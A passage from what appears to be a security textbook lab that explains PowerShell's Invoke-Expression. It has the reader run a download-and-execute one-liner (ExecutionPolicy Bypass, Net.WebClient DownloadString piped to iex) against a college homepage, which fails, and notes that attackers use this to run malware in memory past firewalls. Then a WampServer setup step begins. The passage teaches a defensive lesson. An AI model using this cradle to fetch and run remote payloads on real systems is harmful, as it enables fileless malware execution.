the command text is read from standard input.

The following description of **Invoke-Expression** comes from https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7:

The Invoke-Expression cmdlet evaluates or runs a specified string as a command and returns the results of the expression or command. Without Invoke-Expression, a string submitted at the command line is returned (echoed) unchanged.

+   b. Execute the following command in any environment (cmd.exe, Start menu, search box, or even PowerShell itself):

```
powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "iex ((New-object Net.WebClient).DownloadString('https://www.flcc.edu'))"
```

This command downloads a string into RAM with the **DownloadString** function, containing the HTML, CSS, and JavaScript of www.flcc.edu, and then tries to run it with the **Invoke-Expression** cmdlet, referenced by its alias, iex. It isn’t received well, as evidenced by the PowerShell “blood,” but this sets the stage nicely for our big conclusion in the next step.

If attackers can download scripts or malware to run in RAM, like the contents of www.flcc.edu were just sent to RAM (where execution failed), security devices like firewalls can be avoided.

![](bbox=[0.11, 0.65, 0.24, 0.68])

# Step 4 In the last chapter, you used the MariaDB database component of WampServer. Now you’ll be using the Apache web server component.

+   a. Launch WampServer.

+   b. Click the green WampServer icon in the taskbar. If it’s not green, start all services, as you did in Chapter 19.

+   c. From the WampServer menu, click “www directory” to open the corresponding folder.

+   d. In the folder window, click the File menu bar item and make sure